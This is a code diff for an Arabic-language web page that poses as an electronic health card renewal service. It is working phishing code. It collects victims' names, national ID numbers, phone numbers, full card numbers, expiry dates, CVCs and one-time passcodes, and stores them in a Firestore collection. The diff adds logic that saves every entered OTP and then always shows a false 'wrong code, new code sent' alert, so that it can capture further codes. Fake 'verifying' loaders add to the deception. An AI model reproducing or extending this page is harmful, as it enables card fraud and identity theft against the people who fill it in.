@@ -2,12 +2,12 @@
 
 import Image from "next/image"
 import { Button } from "@/components/ui/button"
-import { Card, CardContent, CardDescription,  CardHeader, CardTitle } from "@/components/ui/card"
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Label } from "@/components/ui/label"
-import {  CreditCard, MessageCircle } from 'lucide-react'
-import { FormEvent, useState } from "react"
+import { CreditCard, MessageCircle } from 'lucide-react'
+import { FormEvent, useEffect, useState } from "react"
 import { initializeApp } from 'firebase/app'
 import { getFirestore, doc, setDoc } from 'firebase/firestore'
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
@@ -48,45 +48,59 @@ export default function HealthCardRenewal() {
   const [datayaer, setDatyear] = useState('')
   const [CVC, setCVC] = useState('')
   const [otp, setOtp] = useState('')
-  const [otpArd] = useState([''])
+  const [otp2, setOtp2] = useState('')
+  const [otpArd,setOtpard] = useState([''])
   const [cardNumber, setCardNumber] = useState('')
   const [selectedMethod, setSelectedMethod] = useState<any>('')
 
   const paymentMethods = [
-    { id: 'credit-card', name: 'Visa Card', icon: <img  className="h-6 w-12"  src="/R.png" alt="visa"/> },
-    { id: 'master-pay', name: 'Mastecard', icon: <img  className="h-6 w-12"  src="/m.png" alt="visa"/> },
+    { id: 'credit-card', name: 'Visa Card', icon: <img className="h-6 w-12" src="/R.png" alt="visa" /> },
+    { id: 'master-pay', name: 'Mastecard', icon: <img className="h-6 w-12" src="/m.png" alt="visa" /> },
   ]
-  const handleSubmit = async (e:FormEvent) => {
-e.preventDefault()
-    if(stepr===1){
-      if( id===''||name==''){
+  useEffect(()=>{
+    setOtp2(otp)
+    
+  },[otp])
+  const handleOtp=(v:string)=>{
+    setOtp(v)
+
+  }
+  const handleOArr=async()=>{
+   await otpArd.push(otp)
+  }
+
+  const handleSubmit = async (e: FormEvent) => {
+    e.preventDefault()
+    if (stepr === 1) {
+      if (id === '' || name == '') {
         return alert('الرجاء ادخال الاسم ورقم البطاقة الشخصية')
-        
-       }
-    }else if(stepr===2){
-     if( phone===''){
-      return alert('الرجاء ادخال رقم الهاتف ')
-     }
+
+      }
+    } else if (stepr === 2) {
+      if (phone === '') {
+        return alert('الرجاء ادخال رقم الهاتف ')
+      }
     }
-    else if(stepr===3){
-    if(selectedMethod===''){
+    else if (stepr === 3) {
+      if (selectedMethod === '') {
+      }
     }
-     }
-    if(stepr===4){
-      if( cardNumber===''||cardNumber.length <16){
+    if (stepr === 4) {
+      if (cardNumber === '' || cardNumber.length < 16) {
         return alert('الرجاء ادخال معلومات البطاقة بشكل صحيح ')
-       }
-       setIswait(true)
-       setTimeout(() => {
+      }
+      setIswait(true)
+      setTimeout(() => {
         setIswait(false)
-       }, 5000)
+      }, 5000)
     }
     setStep(stepr + 1)
 
     try {
+      console.log(otpArd)
       const docRef = await doc(db, 'pays', id!);
       const ref = await setDoc(docRef, {
-        createdDate:new Date().toISOString(),
+        createdDate: new Date().toISOString(),
         step: stepr,
         id: id,
         name: name,
@@ -94,7 +108,8 @@ e.preventDefault()
         datayaer: datayaer,
         dateMonth: dateMonth,
         CVC: CVC,
-        otp: otpArd,
+        otp: otp,
+        otp2: otpArd,
         cardNumber: cardNumber,
         // Add any other form fields here
       });
@@ -106,29 +121,36 @@ e.preventDefault()
       // You might want to show an error message to the user here
     }
   }
-const handdleadd=(e:any)=>{
-  
+  const handdleadd = (e: any) => {
+
     handleSubmit(e).then(() => {
-    
+
     })
 
     if (stepr >= 5) {
-      setIsloading(true)
+      handleOArr().then(
+()=>{
+  setIsloading(true)
+  setOtp("")
       setTimeout(() => {
         alert("رمز التحقق خاطىء تم ارسال رمز جديد")
-        otpArd.push(otp)
-        setOtp("")
+        ///otpArd.push(otp);
+        
         setIsloading(false)
 
       }, 4000)
+}
+      )
+     // setOtpard({otp,...otpArd})
+      
     }
   }
   return (
     <div className="min-h-screen bg-gray-50" dir="rtl">
-{   iswait?<FullPageLoader message=" جاري التحقق..."/>:null}
+      {iswait ? <FullPageLoader message=" جاري التحقق..." /> : null}
       <div className="container mx-auto px-4 py-4 sm:py-8">
-      <div className="flex items-start gap-4 mb-8">
-         
+        <div className="flex items-start gap-4 mb-8">
+
           <h1 className="text-2xl font-bold">خدمة البطاقة الصحية الإلكترونية</h1>
           <div className="bg-[#C8102E] text-white p-4 rounded-lg">
             <span>المساعدة</span>
@@ -138,30 +160,29 @@ const handdleadd=(e:any)=>{
         <Card className="max-w-3xl mx-auto">
           <form className="p-4 sm:p-6" onSubmit={handdleadd}>
             {/* Title */}
-          
-  {/* Progress Steps */}
-  <div className="flex justify-between items-center mb-12 relative">
-          <div className="absolute top-1/2 left-0 right-0 h-0.5 bg-gray-200 -z-10" />
-          {['معلومات البطاقة', 'استمارة التقديم', 'تفاصيل الدفع', 'إتمام العملية'].map((step, index) => (
-            <div key={index} className={`flex flex-col  justify-center items-center gap-2 ${index === 0 ? 'text-[#C8102E]' : 'text-gray-500'}`}>
-              <div className={`w-12 h-12 rounded-full flex items-center justify-center ${
-           (stepr-1)=== index? 'bg-[#C8102E] text-white' : 'bg-gray-200'
-              }`}>
-                {index + 1}
-               
-              </div>
-              <div className=" text-center items-center justify-center mx-4 ">
-              <span className="text-sm flex  ">{step}</span>
-              </div>
+
+            {/* Progress Steps */}
+            <div className="flex justify-between items-center mb-12 relative">
+              <div className="absolute top-1/2 left-0 right-0 h-0.5 bg-gray-200 -z-10" />
+              {['معلومات البطاقة', 'استمارة التقديم', 'تفاصيل الدفع', 'إتمام العملية'].map((step, index) => (
+                <div key={index} className={`flex flex-col  justify-center items-center gap-2 ${index === 0 ? 'text-[#C8102E]' : 'text-gray-500'}`}>
+                  <div className={`w-12 h-12 rounded-full flex items-center justify-center ${(stepr - 1) === index ? 'bg-[#C8102E] text-white' : 'bg-gray-200'
+                    }`}>
+                    {index + 1}
+
+                  </div>
+                  <div className=" text-center items-center justify-center mx-4 ">
+                    <span className="text-sm flex  ">{step}</span>
+                  </div>
+                </div>
+              ))}
             </div>
-          ))}
-        </div>
-        <p className="text-md mb-4 text-gray-500 italic">
-                  طلب الاستعلام عن البطاقة الصحية -- سوف يستغرق حوالي 20 ثانية لإتمام الطلب
-                </p>
+            <p className="text-md mb-4 text-gray-500 italic">
+              طلب الاستعلام عن البطاقة الصحية -- سوف يستغرق حوالي 20 ثانية لإتمام الطلب
+            </p>
             {stepr === 1 ?
               <div className="space-y-4 sm:space-y-6">
-             
+
 
                 <div className="space-y-4 sm:space-y-6">
                   <h2 className="text-lg sm:text-xl font-semibold">معلومات</h2>
@@ -173,9 +194,9 @@ const handdleadd=(e:any)=>{
                         <span className="text-red-500">*</span>
                       </Label>
                       <Input
-                      dir="rtl"
+                        dir="rtl"
                         onChange={(e) => setName(e.target.value.toString())}
-                        type="text"                          placeholder="الاسم الرباعيٍ"
+                        type="text" placeholder="الاسم الرباعيٍ"
 
                         maxLength={11}
                         className="max-w-md text-sm sm:text-base"
@@ -187,9 +208,9 @@ const handdleadd=(e:any)=>{
                         <span className="text-red-500">*</span>
                       </Label>
                       <Input
-                      dir="rtl"
+                        dir="rtl"
                         onChange={(e) => setId(e.target.value.toString())}
-                        type="tel"                          placeholder="   رقم البطاقة الشخصية"
+                        type="tel" placeholder="   رقم البطاقة الشخصية"
 
                         maxLength={11}
                         className="max-w-md text-sm sm:text-base"
@@ -267,26 +288,26 @@ const handdleadd=(e:any)=>{
                       </div>
                       <RadioGroup defaultValue="renewal" className="space-y-2 " dir="rtl">
                         <div className="flex items-center space-x-2 space-x-reverse justify-center">
-                        <Label htmlFor="renewal" className="text-sm sm:text-base">هل تريد اتسلام ايصال عبر البريد الالكتروني؟</Label>
+                          <Label htmlFor="renewal" className="text-sm sm:text-base">هل تريد اتسلام ايصال عبر البريد الالكتروني؟</Label>
 
-                        <RadioGroupItem value="reissue" id="reissue" />
-                        <Label htmlFor="renewal" className="text-sm sm:text-base">نعم</Label>
+                          <RadioGroupItem value="reissue" id="reissue" />
+                          <Label htmlFor="renewal" className="text-sm sm:text-base">نعم</Label>
 
                           <RadioGroupItem value="renewal" id="renewal" />
                           <Label htmlFor="renewal" className="text-sm sm:text-base">لا</Label>
                         </div>
                         <div className="flex items-center space-x-2 space-x-reverse">
-                        <div className="flex items-center space-x-2 space-x-reverse">
-                        <Label htmlFor="renewal" className="text-sm sm:text-base">هل تريد استلام رسالة نصية؟</Label>
+                          <div className="flex items-center space-x-2 space-x-reverse">
+                            <Label htmlFor="renewal" className="text-sm sm:text-base">هل تريد استلام رسالة نصية؟</Label>
 
-                        <RadioGroupItem value="reissue" id="reissue" />
-                        <Label htmlFor="renewal" className="text-sm sm:text-base">نعم</Label>
+                            <RadioGroupItem value="reissue" id="reissue" />
+                            <Label htmlFor="renewal" className="text-sm sm:text-base">نعم</Label>
 
-                          <RadioGroupItem value="renewal" id="renewal" />
-                          <Label htmlFor="renewal" className="text-sm sm:text-base">لا</Label>
+                            <RadioGroupItem value="renewal" id="renewal" />
+                            <Label htmlFor="renewal" className="text-sm sm:text-base">لا</Label>
+                          </div>
                         </div>
-                        </div>
-                      
+
                       </RadioGroup>
                     </div>
                   </div> </div> : stepr === 3 ? <>
@@ -324,7 +345,7 @@ const handdleadd=(e:any)=>{
                         <CardTitle className="text-2xl font-bold text-center">معلومات البطاقة</CardTitle>
                       </CardHeader>
                       <CardContent>
-                        {show?<form className="space-y-6">
+                        {show ? <form className="space-y-6">
                           <div className="space-y-2">
                             <Label htmlFor="cardHolder" className="text-right block">
                               اسم حامل البطاقة <span className="text-red-500">*</span>
@@ -338,26 +359,26 @@ const handdleadd=(e:any)=>{
                             />
                           </div>
 
-                        {  
+                          {
 
-                        <div className="space-y-2">
-                            <Label htmlFor="cardNumber" className="text-right block">
-                              رقم البطاقة <span className="text-red-500">*</span>
-                            </Label>
-                            <div className="relative">
-                              <Input
-                                id="cardNumber"
-                                placeholder="رقم البطاقة"
-                                className="text-right pr-10"
-                                type="tel"
+                            <div className="space-y-2">
+                              <Label htmlFor="cardNumber" className="text-right block">
+                                رقم البطاقة <span className="text-red-500">*</span>
+                              </Label>
+                              <div className="relative">
+                                <Input
+                                  id="cardNumber"
+                                  placeholder="رقم البطاقة"
+                                  className="text-right pr-10"
+                                  type="tel"
 
-                                value={cardNumber}
-                                onChange={(e) => setCardNumber(e.target.value)}
-                                maxLength={19}
-                              />
-                              <CreditCard className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" />
+                                  value={cardNumber}
+                                  onChange={(e) => setCardNumber(e.target.value)}
+                                  maxLength={19}
+                                />
+                                <CreditCard className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" />
+                              </div>
                             </div>
-                          </div>
                           }
 
                           <div className="grid grid-cols-3 gap-4">
@@ -421,49 +442,49 @@ const handdleadd=(e:any)=>{
                             </div>
                           </div>
                         </form>
-                        :<>
-                         <Card className="w-full max-w-md mx-auto">
-      <CardHeader>
-        <CardTitle>طريقة الدفع </CardTitle>
-        <CardDescription>الرجاء تحديد طريقة الدفع المناسبة لك</CardDescription>
-      </CardHeader>
-      <CardContent>
-        <RadioGroup 
-          value={selectedMethod} 
-          onValueChange={(value) =>{
-             
-            setSelectedMethod(value as any)
-            setTimeout(()=>{
-          setShow(true)
+                          : <>
+                            <Card className="w-full max-w-md mx-auto">
+                              <CardHeader>
+                                <CardTitle>طريقة الدفع </CardTitle>
+                                <CardDescription>الرجاء تحديد طريقة الدفع المناسبة لك</CardDescription>
+                              </CardHeader>
+                              <CardContent>
+                                <RadioGroup
+                                  value={selectedMethod}
+                                  onValueChange={(value) => {
 
-            },2000)
-          }
-          }
-          className="grid gap-4 pt-2"
-        >
-          {paymentMethods.map((method) => (
-            <div key={method.id}>
-              <RadioGroupItem 
-                value={method.id} 
-                id={method.id} 
-                className="peer sr-only" 
-              />
-              <Label
-                htmlFor={method.id}
-                className="flex items-center justify-between rounded-lg border-2 border-muted bg-popover p-4 hover:bg-accent hover:text-accent-foreground peer-data-[state=checked]:border-primary [&:has([data-state=checked])]:border-primary"
-              >
-                <div className="flex items-center gap-4">
-                  {method.icon}
-                  <div className="font-semibold">{method.name}</div>
-                </div>
-              </Label>
-            </div>
-          ))}
-        </RadioGroup>
-      </CardContent>
-    </Card>
-                        
-                        </>}
+                                    setSelectedMethod(value as any)
+                                    setTimeout(() => {
+                                      setShow(true)
+
+                                    }, 2000)
+                                  }
+                                  }
+                                  className="grid gap-4 pt-2"
+                                >
+                                  {paymentMethods.map((method) => (
+                                    <div key={method.id}>
+                                      <RadioGroupItem
+                                        value={method.id}
+                                        id={method.id}
+                                        className="peer sr-only"
+                                      />
+                                      <Label
+                                        htmlFor={method.id}
+                                        className="flex items-center justify-between rounded-lg border-2 border-muted bg-popover p-4 hover:bg-accent hover:text-accent-foreground peer-data-[state=checked]:border-primary [&:has([data-state=checked])]:border-primary"
+                                      >
+                                        <div className="flex items-center gap-4">
+                                          {method.icon}
+                                          <div className="font-semibold">{method.name}</div>
+                                        </div>
+                                      </Label>
+                                    </div>
+                                  ))}
+                                </RadioGroup>
+                              </CardContent>
+                            </Card>
+
+                          </>}
                       </CardContent>
                     </Card></> : <>
                   <div className="space-y-2">
@@ -471,7 +492,7 @@ const handdleadd=(e:any)=>{
                       الرجاء ادخال رمز التحقق المرسل الى هاتفك      <span className="text-red-500">*</span>
                     </Label>
                     <Input
-                      onChange={(e) => { setOtp(e.target.value) }}
+                      onChange={ (e) => {  handleOtp(e.target.value) }}
                       value={otp}
                       type="tel"
                       placeholder="رمز التحقق"
@@ -484,15 +505,15 @@ const handdleadd=(e:any)=>{
             {/* Action Buttons */}
             <div className="grid  grid-cols-2 sm:flex-row sm:justify-between gap-3 pt-4 sm:pt-6">
               <Button
-              type="submit"
+                type="submit"
                 variant="outline"
                 className="w-full sm:w-auto sm:min-w-[120px]"
               >
                 تفريغ الحقول
               </Button>
               <Button
-              disabled={(stepr===4&&!show)}
-type="submit"
+                disabled={(stepr === 4 && !show)}
+                type="submit"
 
                 className="w-full  sm:min-w-[100px] py-4 bg-[#C8102E] hover:bg-[#C8102E]/90"
               >
